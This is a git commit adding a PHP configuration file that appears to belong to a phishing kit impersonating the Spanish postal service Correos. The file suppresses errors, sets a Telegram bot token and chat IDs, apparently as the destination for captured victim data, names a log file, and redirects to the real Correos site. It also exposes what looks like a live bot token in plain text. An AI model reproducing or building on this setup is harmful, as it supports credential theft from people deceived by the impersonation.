2ccee390fb1d79e1badcf210ef3b7c5ca811cb22
seriiigioo <117988549+seriiigioo@users.noreply.github.com>
2022-11-15 17:37:37 +0100

    J

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5658492769:AAEOI-6jY73wLaT_ukOqZykO95nAC_W48UQ");
+define("TELEGRAM_CHAT_ID", "871194113");
+define("TELEGRAM_CHAT_IDD", "-871194113");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
